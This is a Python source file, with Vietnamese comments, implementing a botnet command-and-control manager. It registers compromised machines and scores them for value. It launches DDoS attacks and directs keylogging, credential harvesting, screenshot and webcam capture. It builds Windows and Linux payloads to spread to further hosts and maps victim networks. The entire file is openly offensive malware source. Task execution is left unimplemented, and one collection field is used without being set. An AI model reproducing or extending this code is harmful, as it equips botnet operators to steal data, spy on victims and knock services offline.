import threading
import queue
import json
import time
import logging
from datetime import datetime
from typing import Dict, List, Set, Optional, Any
from dataclasses import dataclass, field
import networkx as nx
from concurrent.futures import ThreadPoolExecutor

from payload.modules.keylogger import Keylogger
from payload.modules.credential_harvester import CredentialHarvester
from payload.modules.data_harvester import DataHarvester
from payload.modules.screenshot import ScreenshotCapture
from payload.modules.webcam import WebcamCapture
from core.exploit_builder import ExploitBuilder, PayloadConfig
from network.network_discovery import NetworkDiscovery
from network.spreading import NetworkSpreader

@dataclass
class Bot:
    """Thông tin về một bot"""
    id: str
    ip: str
    hostname: Optional[str] = None
    os: Optional[str] = None
    arch: Optional[str] = None
    status: str = 'active'
    capabilities: Dict[str, bool] = field(default_factory=dict)
    tasks: List[Dict] = field(default_factory=list)
    last_seen: datetime = field(default_factory=datetime.now)
    score: int = 0
    tags: Set[str] = field(default_factory=set)

@dataclass
class Attack:
    """Thông tin về một cuộc tấn công"""
    id: str
    type: str
    target: str
    params: Dict
    bots: List[str]
    start_time: datetime
    duration: int
    status: str = 'running'
    stats: Dict = field(default_factory=dict)

class BotnetManager:
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.bots: Dict[str, Bot] = {}
        self.tasks = queue.Queue()
        self.results = queue.Queue()
        self.attacks: Dict[str, Attack] = {}
        self.collections: Dict[str, Dict] = {}
        
        # Components
        self.exploit_builder = ExploitBuilder()
        self.network_discovery = NetworkDiscovery()
        self.network_spreader = NetworkSpreader(self.network_discovery)
        
        # Task executor
        self.executor = ThreadPoolExecutor(max_workers=20)
        self.running = True
        
        # Network topology
        self.graph = nx.DiGraph()
        
        # Start background tasks
        self._start_background_tasks()
        
    def _start_background_tasks(self):
        """Khởi động các background tasks"""
        threading.Thread(
            target=self._process_task_queue,
            daemon=True
        ).start()
        
        threading.Thread(
            target=self._monitor_attacks,
            daemon=True
        ).start()
        
        threading.Thread(
            target=self._update_network_topology,
            daemon=True
        ).start()
        
        # Start network discovery
        self.network_discovery.start_discovery()
        
    def register_bot(self, bot_id: str, info: Dict) -> None:
        """Đăng ký bot mới"""
        bot = Bot(
            id=bot_id,
            ip=info.get('ip', ''),
            hostname=info.get('hostname'),
            os=info.get('os'),
            arch=info.get('arch'),
            capabilities=self._detect_capabilities(info)
        )
        
        # Calculate initial score
        bot.score = self._calculate_bot_score(bot)
        
        # Add tags
        if info.get('os', '').startswith('Windows'):
            bot.tags.add('windows')
        elif info.get('os', '').startswith('Linux'):
            bot.tags.add('linux')
            
        if 'server' in info.get('os', '').lower():
            bot.tags.add('server')
            
        self.bots[bot_id] = bot
        self._update_graph_bot(bot)
        self.logger.info(f"Registered new bot: {bot_id}")
        
    def _detect_capabilities(self, info: Dict) -> Dict[str, bool]:
        """Phát hiện khả năng của bot"""
        os = info.get('os', '').lower()
        arch = info.get('arch', '').lower()
        
        capabilities = {
            'ddos': True,  # Basic capability
            'harvest_data': True,  # Basic capability
            'spread': True,  # Basic capability
            
            # OS-specific capabilities
            'keylogging': 'windows' in os,
            'screenshot': 'windows' in os or 'linux' in os,
            'webcam': False,  # Need to verify
            
            # Architecture-specific
            'exploit_64bit': 'x64' in arch or 'amd64' in arch,
            'exploit_32bit': 'x86' in arch or 'i386' in arch,
            
            # Advanced capabilities
            'privilege_escalation': False,  # Need to verify
            'lateral_movement': False,  # Need to verify
            'persistence': False  # Need to verify
        }
        
        return capabilities
        
    def _calculate_bot_score(self, bot: Bot) -> int:
        """Tính điểm cho bot"""
        score = 0
        
        # OS score
        if 'windows' in bot.tags:
            score += 30
        elif 'linux' in bot.tags:
            score += 25
            
        if 'server' in bot.tags:
            score += 20
            
        # Capability score  
        if bot.capabilities.get('privilege_escalation'):
            score += 15
        if bot.capabilities.get('lateral_movement'):
            score += 15
        if bot.capabilities.get('persistence'):
            score += 10
            
        # Activity score
        if len(bot.tasks) > 0:
            success_rate = len([t for t in bot.tasks if t.get('status') == 'completed']) / len(bot.tasks)
            score += int(success_rate * 10)
            
        return score
        
    def assign_task(self, bot_id: str, task_type: str, params: Optional[Dict] = None) -> bool:
        """Gán task cho bot"""
        if bot_id not in self.bots:
            return False
            
        bot = self.bots[bot_id]
        
        # Verify capability
        if task_type not in bot.capabilities:
            self.logger.warning(f"Bot {bot_id} does not support {task_type}")
            return False
            
        task = {
            'id': self._generate_id('task'),
            'type': task_type,
            'params': params or {},
            'status': 'pending',
            'timestamp': datetime.now(),
            'bot_id': bot_id
        }
        
        bot.tasks.append(task)
        self.tasks.put(task)
        
        self.logger.info(f"Assigned {task_type} task to bot {bot_id}")
        return True
        
    def start_attack(self, attack_type: str, target: str, params: Dict) -> str:
        """Bắt đầu một cuộc tấn công mới"""
        attack_id = self._generate_id('attack')
        
        # Select capable bots
        capable_bots = [
            bot_id for bot_id, bot in self.bots.items()
            if bot.capabilities.get(attack_type) and bot.status == 'active'
        ]
        
        if not capable_bots:
            raise ValueError(f"No bots capable of {attack_type} attack")
            
        # Create attack
        attack = Attack(
            id=attack_id,
            type=attack_type,
            target=target,
            params=params,
            bots=capable_bots,
            start_time=datetime.now(),
            duration=params.get('duration', 3600)
        )
        
        self.attacks[attack_id] = attack
        
        # Assign tasks to bots
        for bot_id in capable_bots:
            self.assign_task(bot_id, attack_type, {
                'attack_id': attack_id,
                'target': target,
                **params
            })
            
        self.logger.info(
            f"Started {attack_type} attack {attack_id} with {len(capable_bots)} bots"
        )
        return attack_id
        
    def start_data_collection(self, collection_type: str, targets: List[str]) -> str:
        """Bắt đầu thu thập dữ liệu"""
        collection_id = self._generate_id('collection')
        
        # Select capable bots
        capable_bots = [
            bot_id for bot_id, bot in self.bots.items()
            if bot.capabilities.get(collection_type) and bot.status == 'active'
        ]
        
        if not capable_bots:
            raise ValueError(f"No bots capable of {collection_type} collection")
            
        # Create collection
        self.collections[collection_id] = {
            'id': collection_id,
            'type': collection_type,
            'targets': targets,
            'bots': capable_bots,
            'start_time': datetime.now(),
            'status': 'running',
            'data': []
        }
        
        # Assign tasks
        for bot_id in capable_bots:
            self.assign_task(bot_id, collection_type, {
                'collection_id': collection_id,
                'targets': targets
            })
            
        self.logger.info(
            f"Started {collection_type} collection {collection_id} with {len(capable_bots)} bots"
        )
        return collection_id
        
    def process_result(self, bot_id: str, task_id: str, result: Dict) -> None:
        """Xử lý kết quả từ bot"""
        if bot_id not in self.bots:
            return
            
        bot = self.bots[bot_id]
        
        # Update task status
        for task in bot.tasks:
            if task['id'] == task_id:
                task['status'] = 'completed'
                task['result'] = result
                task['completion_time'] = datetime.now()
                break
                
        # Process by type
        if result.get('type') in ['ddos', 'flood']:
            self._process_attack_result(bot_id, result)
        elif result.get('type') in ['harvest_data', 'keylogging', 'screenshot']:
            self._process_collection_result(bot_id, result)
            
        # Update bot score
        bot.score = self._calculate_bot_score(bot)
        
        # Add to results queue for GUI
        self.results.put((bot_id, task_id, result))
        
    def _process_attack_result(self, bot_id: str, result: Dict) -> None:
        """Process attack result"""
        attack_id = result.get('attack_id')
        if attack_id not in self.attacks:
            return
            
        attack = self.attacks[attack_id]
        
        # Update statistics
        if 'stats' not in attack.stats:
            attack.stats = {
                'requests_sent': 0,
                'bytes_sent': 0,
                'success_rate': 0,
                'bot_stats': {}
            }
            
        stats = attack.stats
        stats['requests_sent'] += result.get('requests_sent', 0)
        stats['bytes_sent'] += result.get('bytes_sent', 0)
        
        # Track per-bot stats
        stats['bot_stats'][bot_id] = {
            'requests': result.get('requests_sent', 0),
            'bytes': result.get('bytes_sent', 0),
            'success_rate': result.get('success_rate', 0)
        }
        
        # Update overall success rate
        bot_rates = [s['success_rate'] for s in stats['bot_stats'].values()]
        stats['success_rate'] = sum(bot_rates) / len(bot_rates)
        
    def _process_collection_result(self, bot_id: str, result: Dict) -> None:
        """Process data collection result"""
        collection_id = result.get('collection_id')
        if collection_id not in self.collections:
            return
            
        collection = self.collections[collection_id]
        
        # Add data
        if 'data' in result:
            collection['data'].append({
                'bot_id': bot_id,
                'timestamp': datetime.now(),
                'data': result['data']
            })
            
        # Check completion
        if result.get('status') == 'completed':
            collection['bot_status'][bot_id] = 'completed'
            if all(s == 'completed' for s in collection['bot_status'].values()):
                collection['status'] = 'completed'
                collection['end_time'] = datetime.now()
                
    def _process_task_queue(self) -> None:
        """Process task queue"""
        while self.running:
            try:
                task = self.tasks.get(timeout=1)
                bot_id = task['bot_id']
                
                if bot_id in self.bots:
                    bot = self.bots[bot_id]
                    if bot.status == 'active':
                        self.executor.submit(self._execute_task, task)
                        
            except queue.Empty:
                continue
            except Exception as e:
                self.logger.error(f"Task processing error: {str(e)}")
                
    def _execute_task(self, task: Dict) -> None:
        """Execute a task"""
        try:
            bot_id = task['bot_id']
            task_type = task['type']
            
            # Build payload if needed
            if task_type in ['spread', 'exploit']:
                config = PayloadConfig(
                    target_os=self.bots[bot_id].os,
                    arch=self.bots[bot_id].arch,
                    format='exe' if 'windows' in self.bots[bot_id].tags else 'elf'
                )
                result = self.exploit_builder.build_exploit('windows/service_exe', config)
                if not result.success:
                    raise Exception(f"Payload build failed: {result.error}")
                task['params']['payload'] = result.files
                
            # Execute task
            # TODO: Implement actual task execution
            
        except Exception as e:
            self.logger.error(f"Task execution error: {str(e)}")
            task['status'] = 'failed'
            task['error'] = str(e)
            
    def _monitor_attacks(self) -> None:
        """Monitor ongoing attacks"""
        while self.running:
            try:
                current_time = datetime.now()
                
                for attack in list(self.attacks.values()):
                    # Check duration
                    if (current_time - attack.start_time).total_seconds() >= attack.duration:
                        attack.status = 'completed'
                        
                    # Remove completed attacks after 1 hour
                    elif attack.status == 'completed' and \
                         (current_time - attack.start_time).total_seconds() >= 3600:
                        del self.attacks[attack.id]
                        
                time.sleep(10)
                
            except Exception as e:
                self.logger.error(f"Attack monitoring error: {str(e)}")
                
    def _update_network_topology(self) -> None:
        """Update network topology graph"""
        while self.running:
            try:
                # Get latest network data
                network_data = self.network_discovery.get_network_map()
                
                # Update graph
                self.graph.clear()
                
                # Add subnet nodes
                for subnet, hosts in network_data['subnets'].items():
                    self.graph.add_node(subnet, type='subnet')
                    
                # Add host nodes
                for ip, host in network_data['hosts'].items():
                    self.graph.add_node(ip, type='host', data=host)
                    
                    # Connect to subnet
                    for subnet in network_data['subnets']:
                        if ip in network_data['subnets'][subnet]:
                            self.graph.add_edge(subnet, ip)
                            
                # Add bot nodes
                for bot in self.bots.values():
                    self.graph.add_node(bot.id, type='bot', data=bot)
                    if bot.ip in self.graph:
                        self.graph.add_edge(bot.id, bot.ip)
                        
                time.sleep(60)
                
            except Exception as e:
                self.logger.error(f"Topology update error: {str(e)}")
                
    def _update_graph_bot(self, bot: Bot) -> None:
        """Update bot node in graph"""
        self.graph.add_node(
            bot.id,
            type='bot',
            data=bot
        )
        if bot.ip:
            self.graph.add_edge(bot.id, bot.ip)
            
    def _generate_id(self, prefix: str) -> str:
        """Generate unique ID"""
        import uuid
        return f"{prefix}_{uuid.uuid4().hex[:8]}"
        
    def get_network_status(self) -> Dict:
        """Get network status overview"""
        active_bots = len([b for b in self.bots.values() if b.status == 'active'])
        
        return {
            'total_bots': len(self.bots),
            'active_bots': active_bots,
            'ongoing_attacks': len([a for a in self.attacks.values() if a.status == 'running']),
            'data_collections': len([c for c in self.collections.values() if c['status'] == 'running']),
            'network_coverage': len(self.graph.nodes()),
            'top_bots': sorted(
                [b for b in self.bots.values()],
                key=lambda x: x.score,
                reverse=True
            )[:5]
        }
        
    def get_attack_status(self, attack_id: str) -> Optional[Dict]:
        """Get attack status"""
        if attack_id not in self.attacks:
            return None
            
        attack = self.attacks[attack_id]
        return {
            'id': attack.id,
            'type': attack.type,
            'target': attack.target,
            'status': attack.status,
            'start_time': attack.start_time.isoformat(),
            'duration': attack.duration,
            'active_bots': len([b for b in attack.bots if self.bots[b].status == 'active']),
            'stats': attack.stats
        }
        
    def get_collection_status(self, collection_id: str) -> Optional[Dict]:
        """Get collection status"""
        if collection_id not in self.collections:
            return None
            
        collection = self.collections[collection_id]
        return {
            'id': collection['id'],
            'type': collection['type'],
            'status': collection['status'],
            'start_time': collection['start_time'].isoformat(),
            'end_time': collection.get('end_time', '').isoformat() if collection.get('end_time') else None,
            'bots': len(collection['bots']),
            'data_points': len(collection['data'])
        }
        
    def get_bot_info(self, bot_id: str) -> Optional[Dict]:
        """Get detailed bot info"""
        if bot_id not in self.bots:
            return None
            
        bot = self.bots[bot_id]
        return {
            'id': bot.id,
            'ip': bot.ip,
            'hostname': bot.hostname,
            'os': bot.os,
            'arch': bot.arch,
            'status': bot.status,
            'capabilities': bot.capabilities,
            'score': bot.score,
            'tags': list(bot.tags),
            'tasks': len(bot.tasks),
            'last_seen': bot.last_seen.isoformat()
        }
        
    def get_network_graph(self) -> Dict:
        """Get network topology graph"""
        return nx.node_link_data(self.graph)
        
    def cleanup(self) -> None:
        """Cleanup manager state"""
        self.running = False
        self.executor.shutdown()